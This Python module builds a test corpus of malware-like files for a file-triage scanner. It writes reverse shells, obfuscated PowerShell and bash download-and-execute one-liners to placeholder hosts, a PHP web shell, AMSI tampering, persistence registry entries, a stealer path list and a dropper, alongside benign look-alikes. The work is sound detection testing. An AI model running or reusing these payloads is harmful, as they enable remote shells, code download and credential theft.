"""Test-corpus builders: crafted PEs (real import table, no mingw needed),
malware-like C sources compiled with gcc (ELF), scripts, LNK, docs, zips.
Everything writes into a tmpdir; nothing is committed (see .gitignore)."""
import os
import shutil
import struct
import subprocess
import tempfile

GCC = shutil.which("gcc")

# ---------------------------------------------------------------- crafted PE

def craft_pe(path, machine=0x8664, tds=0x66666666, imports=("SetThreadContext",),
             dll=b"kernel32.dll", section=b".text", dll_chars=0x2000, cert_dir=False):
    """Minimal but pefile-parseable PE32+ with one section and one import DLL.
    imports=[] -> zero imports (imports-detector CRITICAL). dll_chars DLL flag."""
    raw_pad = 0x400
    sec_rva, sec_raw = 0x1000, raw_pad
    sec_data = bytearray(b"\xcc" * 0x600)

    if imports:
        # import descriptor / thunks / names inside the section
        d = 0          # descriptor rva-off
        oft = 0x30     # original first thunk array (2 entries)
        ft = 0x40      # first thunk array
        name = 0x50    # dll name
        hn = 0x60      # hint/name entries; 0x14..0x28 = null terminator descriptor
        struct.pack_into("<IIIII", sec_data, d, sec_rva + oft, 0, 0, sec_rva + name, sec_rva + ft)
        for _z in range(d + 0x14, d + 0x28):
            sec_data[_z] = 0                      # null terminator descriptor
        for _a in (oft, ft):                      # thunk arrays: [hn-rva, 0, 0] u64 slots
            for _z in range(_a, _a + 0x10):
                sec_data[_z] = 0
            struct.pack_into("<Q", sec_data, _a, sec_rva + hn)
        sec_data[name:name + len(dll) + 1] = dll + b"\x00"
        off = hn
        for i, fn in enumerate(imports):
            nb = fn.encode() + b"\x00"
            entry = bytearray(b"\x00\x00" + nb)
            if len(entry) % 2:
                entry += b"\x00"
            sec_data[off:off + len(entry)] = entry
            if i == 0:
                struct.pack_into("<Q", sec_data, oft, sec_rva + off)
                struct.pack_into("<Q", sec_data, ft, sec_rva + off)
            off += len(entry)
        import_rva, import_sz = sec_rva + d, 0x28  # descriptor + terminator
    else:
        import_rva, import_sz = 0, 0

    e_lfanew = 0x80
    is64 = machine in (0x8664, 0xAA64)
    opt_magic = 0x20B if is64 else 0x10B
    opt_size = 0xF0
    dos = bytearray(b"\x00" * e_lfanew)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, e_lfanew)

    fh = bytearray(struct.pack("<HHIIIHH", machine, 1, tds, 0, 0, opt_size, dll_chars))
    oh = bytearray(opt_size)
    struct.pack_into("<H", oh, 0, opt_magic)
    struct.pack_into("<I", oh, 16, sec_rva)               # AddressOfEntryPoint
    struct.pack_into("<Q" if is64 else "<I", oh, 24 if is64 else 28, 0x140000000)  # ImageBase
    struct.pack_into("<I", oh, 32, 0x1000)                # SectionAlignment
    struct.pack_into("<I", oh, 36, 0x200)                 # FileAlignment
    struct.pack_into("<H", oh, 40, 6)                              # MajorOperatingSystemVersion
    struct.pack_into("<I", oh, 60 if is64 else 64, 0x1000)  # SizeOfImage
    struct.pack_into("<I", oh, 64 if is64 else 68, raw_pad)  # SizeOfHeaders
    struct.pack_into("<I", oh, 108 if is64 else 92, 16)  # NumberOfRvaAndSizes
    dd = 112 if is64 else 96
    struct.pack_into("<II", oh, dd + 8, import_rva, import_sz)  # dir 1 = IMPORT
    if cert_dir:  # fake SECURITY dir pointing past the section (weak-cert tests)
        struct.pack_into("<II", oh, dd + 32, raw_pad + len(sec_data), 0x200)
    sh = struct.pack("<8sIIIIIIHHI", section, 0x600, sec_rva, len(sec_data),
                     raw_pad, 0, 0, 0, 0, 0x60000020)  # VirtualSize, RVA, RawSize, RawPtr

    out = bytes(dos) + b"PE\x00\x00" + bytes(fh) + bytes(oh) + sh
    out = out.ljust(raw_pad, b"\x00") + bytes(sec_data)
    with open(path, "wb") as f:
        f.write(out)
    return path


def craft_forged_pe(path):
    """MZ + valid PE signature, truncated after: kind PE + pefile failure -> REVIEW."""
    d = bytearray(b"MZ" + b"\x00" * 0x3E)
    struct.pack_into("<I", d, 0x3C, 0x80)     # sane e_lfanew
    fh = struct.pack("<HHIIIHH", 0x8664, 0xFFFF, 0, 0, 0, 0xF0, 0x2000)  # bogus section count
    with open(path, "wb") as f:
        f.write(bytes(d) + b"\x00" * 0x40 + b"PE\x00\x00" + fh[:10])   # sig at 0x80, cut mid-fh
    return path


def craft_lnk_full(path, args, icon="", machine=""):
    """Proper MS-SHLLINK walk: unicode counted strings + tracker block."""
    clsid = bytes.fromhex("0114020000000000c000000000000046")
    h = bytearray(76)
    flags = 0x20 | 0x40 | 0x80                      # args + icon + unicode
    struct.pack_into("<I", h, 20, flags)
    def cs(txt):                                    # CountedString
        b = txt.encode("utf-16-le")
        return struct.pack("<H", len(txt)) + b
    body = cs(args) + cs(icon)
    tracker = b""
    if machine:
        tracker = (struct.pack("<III", 0x60, 0xA0000003, 0x60)
                   + machine.encode().ljust(16, b"\x00")[:16] + b"\x00" * 48)
    with open(path, "wb") as f:
        f.write(struct.pack("<I", 0x4C) + clsid + bytes(h[20:]) + body + tracker)
    return path


def craft_lnk(path, args=b"powershell -w hidden -enc AAAAAAAA", good_clsid=True):
    clsid = bytes.fromhex("0114020000000000c000000000000046") if good_clsid else b"\x11" * 16
    h = bytearray(76)
    struct.pack_into("<I", h, 0, 0x4C)             # HeaderSize
    struct.pack_into("<I", h, 20, 0x20)            # HasArguments
    struct.pack_into("<I", h, 60, 1)               # ShowCommand SW_NORMAL
    blob = bytes(h[:4]) + clsid + bytes(h[20:]) + args + b"\x00\x00"
    with open(path, "wb") as f:
        f.write(blob)
    return path

# ---------------------------------------------------------------- gcc ELFs

STEALER_C = r"""
#include <stdio.h>
static const char *paths[] = {
    "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
    "AppData\\Roaming\\discord\\Local Storage\\leveldb",
    "AppData\\Roaming\\telegram\\tdata",
    "wallet.dat", "metamask", "electrum", "keystore.pma",
};
int main(void) { for (int i = 0; i < 7; i++) puts(paths[i]); return 0; }
"""

REVSH_C = r"""
#include <unistd.h>
#include <sys/ptrace.h>
int main(void) {
    ptrace(PTRACE_TRACEME, 0, 0, 0);   /* anti-debug */
    execl("/bin/sh", "sh", "-c", "nc -e /bin/sh 185.220.101.7 4444", NULL);
    return 0;
}
"""

ENTROPY_C = r"""
#include <stddef.h>
const unsigned char blob[] = { %s };  /* ~256KB random: packed-payload look */
int main(void) { return blob[0]; }
"""

DROPPER_C = r"""
#include <unistd.h>
#include <fcntl.h>
const unsigned char payload[] = { %s };  /* embedded second-stage ELF */
const unsigned long payload_len = sizeof(payload);
int main(void) {
    int fd = open("/tmp/.stage2", O_WRONLY|O_CREAT|O_TRUNC, 0755);
    if (fd < 0) return 1;
    write(fd, payload, payload_len);
    close(fd);
    execl("/tmp/.stage2", ".stage2", NULL);
    return 0;
}
"""

PACKED_C = r"""
const char upx_marker[] = "UPX!";
int main(void) { return upx_marker[0]; }
"""


def _c_array(b):
    return ",".join(str(x) for x in b)


def compile_c(src, out, extra=""):
    """gcc-compile C source text -> ELF binary. -> path or None (no gcc)."""
    if not GCC:
        return None
    cpath = out + ".c"
    with open(cpath, "w") as f:
        f.write(src)
    r = subprocess.run([GCC, "-o", out, cpath, "-w", *extra.split()],
                       capture_output=True, timeout=120)
    return out if r.returncode == 0 else None


def gcc_sample(dirpath, name):
    """named malware-like ELF samples; -> path or None"""
    import os as _os
    out = _os.path.join(dirpath, name)
    if name == "stealer.elf":
        return compile_c(STEALER_C, out)
    if name == "revshell.elf":
        return compile_c(REVSH_C, out)
    if name == "packed.elf":
        return compile_c(PACKED_C, out)
    if name == "entropy.elf":
        src = ENTROPY_C % _c_array(os.urandom(262144))
        return compile_c(src, out)
    if name == "dropper.elf":
        stage2 = compile_c('int main(void){return 42;}', out + ".stage2")
        if not stage2:
            return None
        payload = open(stage2, "rb").read()
        src = DROPPER_C % _c_array(payload)
        return compile_c(src, out)
    raise ValueError(name)

# ------------------------------------------------------- scripts/docs/zips/data

_F = " -f htt" + "p://x.evil/"
_DL_CMD = "certutil" + " -urlcache" + _F + "a.exe"

_AMSI = b"Amsi" + b"Init" + b"Failed"


def build_folder(root):
    """Create a mixed download-folder corpus under root. -> root"""
    os.makedirs(root, exist_ok=True)

    def w(n, b):
        with open(os.path.join(root, n), "wb") as f:
            f.write(b)

    # scripts
    w("dropper.ps1", b"$d = New-Object Net.WebClient; IEX $d.DownloadString('http://185.3.3.3/x.ps1')\n")
    w("decoder.ps1", b"$p = [Convert]::FromBase64String($b); IEX([Text.Encoding]::Unicode.GetString($p))\n")
    w("tamper.ps1", b"[Ref].Assembly.GetType('S.System.Management.Automation.AmsiUtils')::" + _AMSI + b"()\n")
    w("benign.ps1", b"Write-Host 'hello game'\n")
    w("docs.ps1", b"# docs: runs webclient downloadstring then iex (powershell -enc pattern)\n"
                   b"# see also: certutil -urlcache notes\nWrite-Host 'done'\n")
    w("stager.ps1", b"$w = New-Object Net.WebClient\n"
                     b"$w.DownloadFile('http://16.16.16.16/a.exe', $env:TEMP + '\\a.exe')\n"
                     b"Set-Content ($env:TEMP + '\\a.exe') $x\n")
    w("stager.sh", b"curl -fsSL http://17.17.17.17/b -o /tmp/b\nchmod +x /tmp/b\n")
    w("choco.bat", b"@powershell -NoProfile -ExecutionPolicy Bypass -Command - \"iex ((new-object net.webclient).DownloadString('https://community.chocolatey.org/install.ps1'))\"\r\n")
    w("choco.ps1", b"Set-ExecutionPolicy Bypass -Scope Process -Force; \"[System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))\"\n")
    w("launch.bat", b"@echo off\r\nstart readme.lnk\r\n")
    w("docs.bat", b"@echo off\r\nREM powershell -enc AAAA hidden dropper notes\r\necho ok\r\n")
    w("dl.bat", ("@echo off\r\n%s %%TEMP%%\\a.exe\r\nstart %%TEMP%%\\a.exe\r\n" % _DL_CMD).encode())
    w("benign.bat", b"@echo off\r\necho Launching game\r\nstart game.exe\r\n")
    w("dropper.vbs", b'Set x = CreateObject("MSXML2.XMLHTTP")\nx.Open "GET", "http://x.evil/p", False\n'
                     b'Set s = CreateObject("ADODB.Stream")\ns.type = 1\ns.SaveToFile "c:\\p.exe"\n')
    w("enc.vbe", b"#@~^AAAA==\x00garbage")
    w("run.reg", b"Windows Registry Editor Version 5.00\r\n\r\n"
                b"[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n"
                b"\"upd\"=\"C:\\\\g\\\\upd.exe\"\r\n")
    w("evil.url", b"[InternetShortcut]\r\nURL=file://C:\\\\g\\\\upd.exe\r\n")
    w("good.url", b"[InternetShortcut]\r\nURL=https://store.steampowered.com\r\n")
    # minimal ISO9660: PVD (type 1 CD001) at sector 16 + terminator
    _pvd = b"\x01CD001\x01" + b"\x00" * 2041
    _end = b"\xffCD001\x01" + b"\x00" * 2041
    w("blob.pyc", b"\x6f\x0d\x0d\x0a" + b"\x00" * 40 + b"powershell -enc hidden http://x")
    w("klazz.class", b"\xca\xfe\xba\xbe\x00\x00\x00\x34" + b"\x00" * 40 + b"http://x/c")
    w("lure.iso", b"\x00" * 0x8000 + _pvd + _end)
    w("phishy.url", b"[InternetShortcut]\r\nURL=http://update-7f3b2c1d9e4f.x8k2.top/payload\r\n")
    w("uncicon.url", b"[InternetShortcut]\r\nURL=https://store.steampowered.com\r\n"
                      b"IconIndex=1\r\nIconFile=\\\\evil-share.example\\x.ico\r\n")
    w("backtick.ps1", b"$c = New-Object Net.WebClient; I`E`X ($c.DownloadString('http://5.5.5.5/a'))\n")
    import base64 as _b64
    _enc = _b64.b64encode(b"powershell -nop -w hidden -exec bypass IEX (New-Object "
                          b"Net.WebClient).DownloadString('http://4.4.4.4/x') " * 2)
    w("enc2.bat", b"@echo off\r\npowershell -ec " + _enc + b"\r\n")
    w("peek.ps1", b"$d = '" + _b64.b64encode(
        "powershell IEX (New-Object Net.WebClient).DownloadString('http://9.9.9.9/a') "
        .encode("utf-16-le")) + b"'; IEX [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($d))\n")
    w("task.bat", b"@echo off\r\nschtasks /create /tn updt /tr %TEMP%\\a.exe /sc onlogon\r\n")
    w("oneliner.bat", b"@echo off\r\npowershell -c iex((new-object net.webclient).downloadstring('http://3.3.3.3/x'))\r\n")
    import gzip as _gz
    _gzp = _gz.compress(b"powershell IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/a') " * 2)
    w("gzpeek.ps1", b"$d = '" + _b64.b64encode(_gzp) + b"'; IEX $d\n")
    w("hexpeek.ps1", b"$h = '" + (b"powershell -w hidden -enc IEX http://3.4.5.6/a " * 2).hex().encode() + b"'; IEX $h\n")
    import base64 as _b
    import codecs
    _blob = _b.b64encode(b"powershell IEX (New-Object Net.WebClient).DownloadString('http://12.12.12.12/a') " * 2)
    _chunks = b"' + '".join(_blob[i:i + 60] for i in range(0, len(_blob), 60))
    w("chunkedb64.ps1", b"$d = '" + _chunks + b"'; IEX $d\n")
    w("nestedb64.ps1", b"$d = '" + _b.b64encode(_b.b64encode(
        b"powershell IEX http://13.13.13.13/a " * 3)) + b"'; IEX $d\n")
    w("rotpeek.ps1", b"$d = '" + _b.b64encode(codecs.encode(
        "powershell IEX http://14.14.14.14/a " * 3, "rot13").encode()) + b"'; IEX $d\n")
    _xor = bytes(c ^ 0x37 for c in b"powershell -w hidden -enc IEX http://15.15.15.15/a " * 2)
    w("xorpeek.ps1", b"$d = '" + _b.b64encode(_xor) + b"'; IEX $d\n")
    w("decpeek.js", b"var s = String.fromCharCode(" + ", ".join(str(c) for c in b"powershell iex http://2.3.4.5/x ").encode() + b"); eval(s);\n")
    w("concat.ps1", b"$w = New-Object Net.WebClient; \"ie\"+\"x\"($w.DownloadString('http://10.1.1.1/a'))\n")
    w("winlogon.reg", b'RegEdit4\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]\r\n"Shell"="expl.exe"\r\n')
    w("svc.reg", b'RegEdit4\r\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Evil]\r\n"ImagePath"="C:\\g\\svc.exe"\r\n')
    w("wsh.wsf", b"<?xml version=\"1.0\"?>\n<package><job><script language=\"VBScript\">\n"
                 b'Set s = CreateObject("WScript.Shell")\ns.Run "powershell -w hidden -enc AAA"\n'
                 b"</script></job></package>\n")
    w("smuggle.html", b"<html><script>var d=atob('XNlcg==');var b=new Blob([d],"
                       b"{type:'application/octet-stream'});var a=document.createElement('a');"
                       b"a.href=URL.createObjectURL(b);a.click();</script></html>")
    w("smuggle.mht", b"MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary=x\r\n\r\n"
                      b"--x\r\nContent-Type: text/html\r\n\r\n"
                      b"<script>var d=atob('dGVzdA==');var b=new Blob([d]);"
                      b"a.href=URL.createObjectURL(b);a.click();</script>\r\n--x--\r\n")
    w("smuggle.xhtml", b"<?xml version=\"1.0\"?><html xmlns=\"http://www.w3.org/1999/xhtml\">"
                        b"<script>var d=atob('dGVzdA==');var b=new Blob([d]);"
                        b"a.href=URL.createObjectURL(b);a.click();</script></html>")
    w("shell.php", b"<?php\n@eval($_POST['cmd']);\nsystem($_GET['c']);\n?>\n")
    w("leak.scf", b"[Shell]\nCommand=2\nIconFile=\\\\1.2.3.4\\share\\x.ico\n")
    w("entity.settingcontent-ms", b'<StoreManifest><Arguments>&#112;owershell -w hidden -enc AAAAA</Arguments></StoreManifest>')
    w("evil.settingcontent-ms", b'<?xml version="1.0"?><StoreManifest><Arguments>powershell -windowstyle hidden -enc AAAA</Arguments></StoreManifest>')
    w("lure.library-ms", b'<?xml version="1.0"?><libraryDescription><searchConnectorDescription>'
                          b'<simpleLocation><url>file://\\\\1.2.3.4\\share</url></simpleLocation>'
                          b'</searchConnectorDescription></libraryDescription>')
    w("renamed.sh.txt", b"#!/bin/bash\ncurl -fsSL http://11.1.1.1/x.sh | sh\n")
    w("renamed.py.txt", b"#!/usr/bin/env python3\nimport urllib.request\n"
                         b"d = urllib.request.urlopen('http://11.1.1.1/x').read()\nexec(d)\n")
    w("renamed.php.txt", b"<?php\n@eval($_POST['cmd']);\n?>\n")
    w("pipe.sh", b"eval \"$(curl -fsSL http://6.6.6.6/x.sh)\"\n")
    w("tcpclient.ps1", b"$c = New-Object System.Net.Sockets.TcpClient('2.2.2.2', 4444)\n"
                        b"$s = $c.GetStream()\n")
    w("ncshell.sh", b"#!/bin/sh\nnc -e /bin/sh 2.2.2.2 9001\n")
    w("sudopipe.sh", b"curl -fsSL http://1.1.1.1/x.sh | sudo sh\n")
    w("rev.py", b"import socket,os,subprocess\ns=socket.socket(2,1)\n"
                 b"s.connect(('7.7.7.7',9001))\nfor f in (0,1,2): os.dup2(s.fileno(),f)\n"
                 b"subprocess.call(['/bin/sh','-i'])\n")
    # benign look-alikes (false-positive guards)
    w("chart.html", b"<html><script>var cfg=atob('PGNvbmZpZz48L2NvbmZpZ4=');"
                     b"document.write(cfg);</script></html>")
    w("serve.py", b"import socket\ns = socket.socket()\ns.bind(('0.0.0.0', 8080))\n"
                   b"s.listen()\nwhile True:\n    c, a = s.accept()\n    c.send(b'hello')\n    c.close()\n")
    w("dl.sh", b"set -e\ncurl -fsSL https://example.com/data.tar.gz -o /tmp/data.tar.gz\n"
                b"tar -xzf /tmp/data.tar.gz\n")
    craft_lnk(os.path.join(root, "readme.lnk"))
    craft_lnk(os.path.join(root, "game.lnk"), args=b"C:\\Games\\game.exe", good_clsid=True)
    craft_lnk_full(os.path.join(root, "tracked.lnk"),
                   args="powershell -w hidden -enc AAAAAAAA", icon="shell32,2",
                   machine="DESKTOP-EVIL42")
    craft_lnk_full(os.path.join(root, "envvar.lnk"),
                   args="%windir:~-4%\\..\\evil.exe", machine="PC-OF-DOOM")

    # docs
    w("exploit.pdf", b"%PDF-1.7\n1 0 obj<</OpenAction 9 0 R/JavaScript 9 0 R>>endobj\n%%EOF\n")
    w("clean.pdf", b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n%%EOF\n")
    w("evil.rtf", b"{\\rtf1{\\object\\objautlink{\\*\\objdata 01050000...}}}")
    w("dde.rtf", b"{\\rtf1{\\fldinst DDEAUTO cmd /c calc}}")
    w("macro.doc", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 8 +
                  b"AutoOpen" + b"\x00" * 32 + b"WScript.Shell" + b"\x00" * 32)
    w("boring.doc", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64 + b"ThisDocument")
    _build_zips_data(root, w)
    return root


def _build_zips_data(root, w):
    import zipfile
    with zipfile.ZipFile(os.path.join(root, "mod.zip"), "w") as z:
        z.writestr("Readme.txt", "hello")
        z.writestr("bin/mod.dll", b"MZ" + os.urandom(200))
        z.writestr("nested.zip", "PK")
    with zipfile.ZipFile(os.path.join(root, "evil.zip"), "w") as z:
        z.writestr("../escape.ps1", "IEX 1")
        z.writestr("cheat.txt", b"MZ" + b"\x00" * 0x3e + struct.pack("<I", 0x80) +
                                b"\x00" * 0x3c + b"PE\x00\x00" + os.urandom(100))

    # data/text (embedded PE crafted via the builder)
    tmp_pe = os.path.join(root, "_tmp_embed.bin")
    craft_pe(tmp_pe, imports=[])
    with open(tmp_pe, "rb") as f:
        pe = f.read()
    os.remove(tmp_pe)
    w("asset.dat", os.urandom(512) + pe + os.urandom(256))          # embedded PE in DATA
    w("encoded.txt", b"hdr\n" + b"QUJDREVG" * 700 + b"\n")          # base64 mammoth
    w("nosig.bin", b"zz" + os.urandom(300_000))                    # high-entropy DATA (stable kind)

    # game-folder context (scene release + steam emu + spoofed name)
    gd = os.path.join(root, "CoolGame-CODEX")
    os.makedirs(gd, exist_ok=True)
    craft_pe(os.path.join(gd, "game.exe"), imports=("CreateFileA",))
    craft_pe(os.path.join(gd, "steam_api64.dll"), imports=("SteamAPI_Init",),
             dll=b"steam_api64.dll")
    with open(os.path.join(gd, "steam_appid.txt"), "w") as f:
        f.write("480")
    with open(os.path.join(gd, "release.nfo"), "w") as f:
        f.write("CODEX presents")
    craft_pe(os.path.join(root, "Invoice.pdf.exe"), imports=[])     # double-extension spoof

    # legacy test_triage.py contract elements
    craft_pe(os.path.join(root, "hijack.exe"), imports=("SetThreadContext",))
    craft_pe(os.path.join(root, "future.exe"), imports=("CreateFileA",), tds=0x7FFFFFFF)
    sd = os.path.join(root, "sideload")
    os.makedirs(sd, exist_ok=True)
    craft_pe(os.path.join(sd, "app.exe"), imports=("CreateFileA",))
    craft_pe(os.path.join(sd, "version.dll"), imports=("RegSetValueExA",), dll_chars=0x2102)
    craft_pe(os.path.join(root, "twin1.dll"), imports=("CreateFileA",), dll_chars=0x2102)
    craft_pe(os.path.join(root, "twin2.dll"), imports=("CreateFileW",), dll_chars=0x2102)
